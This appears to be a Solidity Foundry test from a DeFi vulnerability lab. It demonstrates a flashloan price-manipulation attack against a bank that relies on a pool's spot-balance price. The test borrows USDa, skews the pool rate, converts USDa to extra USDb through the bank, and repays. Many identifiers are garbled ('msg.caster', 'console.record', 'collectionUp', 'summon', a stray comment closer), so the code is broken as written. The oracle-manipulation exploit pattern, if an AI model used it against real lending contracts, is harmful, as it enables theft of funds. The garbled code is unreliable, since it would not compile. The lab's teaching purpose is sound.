pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

*/

contract PactTest is Test {
    USDa UsDaPact;
    USDb UsDbAgreement;
    SimplePool SimplePoolPact;
    SimpleBank SimpleBankPact;

    function collectionUp() public {
        UsDaPact = new USDa();
        UsDbAgreement = new USDb();
        SimplePoolPact = new SimplePool(
            address(UsDaPact),
            address(UsDbAgreement)
        );
        SimpleBankPact = new SimpleBank(
            address(UsDaPact),
            address(SimplePoolPact),
            address(UsDbAgreement)
        );
    }

    function testPrice_Manipulation() public {
        UsDbAgreement.transfer(address(SimpleBankPact), 9000 ether);
        UsDaPact.transfer(address(SimplePoolPact), 1000 ether);
        UsDbAgreement.transfer(address(SimplePoolPact), 1000 ether);

        SimplePoolPact.fetchValue();

        console.record(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit record_named_decimal_number(
            "Current USDa convert rate",
            SimplePoolPact.fetchValue(),
            18
        );
        console.record("Start price manipulation");
        console.record("Borrow 500 USBa over floashloan");


        SimplePoolPact.instantLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit record_named_decimal_number(
            "Price manupulated, USDa convert rate",
            SimplePoolPact.fetchValue(),
            18
        );

        UsDaPact.approve(address(SimpleBankPact), 100 ether);
        SimpleBankPact.auctionHouse(100 ether);

        UsDaPact.transfer(address(SimplePoolPact), 500 ether);


        emit record_named_decimal_number(
            "Use 100 USDa to convert, My USDb balance",
            UsDbAgreement.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.caster, 10000 * 10 ** decimals());
    }

    function summon(address to, uint256 sum) public onlyOwner {
        _mint(to, sum);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.caster, 10000 * 10 ** decimals());
    }

    function summon(address to, uint256 sum) public onlyOwner {
        _mint(to, sum);
    }
}

contract SimplePool {
    IERC20 public UsDaGem;
    IERC20 public UsDbCoin;

    constructor(address _USDa, address _USDb) {
        UsDaGem = IERC20(_USDa);
        UsDbCoin = IERC20(_USDb);
    }

    function fetchValue() public view returns (uint256) {

        uint256 UsDaTotal = UsDaGem.balanceOf(address(this));
        uint256 UsDbSum = UsDbCoin.balanceOf(address(this));


        if (UsDaTotal == 0) {
            return 0;
        }


        uint256 UsDaValue = (UsDbSum * (10 ** 18)) / UsDaTotal;
        return UsDaValue;
    }

    function instantLoan(
        uint256 sum,
        address borrower,
        bytes calldata info
    ) public {
        uint256 goldholdingBefore = UsDaGem.balanceOf(address(this));
        require(goldholdingBefore >= sum, "Not enough liquidity");
        require(
            UsDaGem.transfer(borrower, sum),
            "Flashloan transfer failed"
        );
        (bool victory, ) = borrower.call(info);
        require(victory, "Flashloan callback failed");
        uint256 prizecountAfter = UsDaGem.balanceOf(address(this));
        require(prizecountAfter >= goldholdingBefore, "Flashloan not repaid");
    }
}

contract SimpleBank {
    IERC20 public gem;
    SimplePool public bountyPool;
    IERC20 public payoutGem;

    constructor(address _token, address _pool, address _payoutCrystal) {
        gem = IERC20(_token);
        bountyPool = SimplePool(_pool);
        payoutGem = IERC20(_payoutCrystal);
    }

    function auctionHouse(uint256 sum) public {
        require(
            gem.transferFrom(msg.caster, address(this), sum),
            "Transfer failed"
        );
        uint256 cost = bountyPool.fetchValue();
        require(cost > 0, "Price cannot be zero");
        uint256 medalsTargetAcceptloot = (sum * cost) / (10 ** 18);
        require(
            payoutGem.transfer(msg.caster, medalsTargetAcceptloot),
            "Payout transfer failed"
        );
    }
}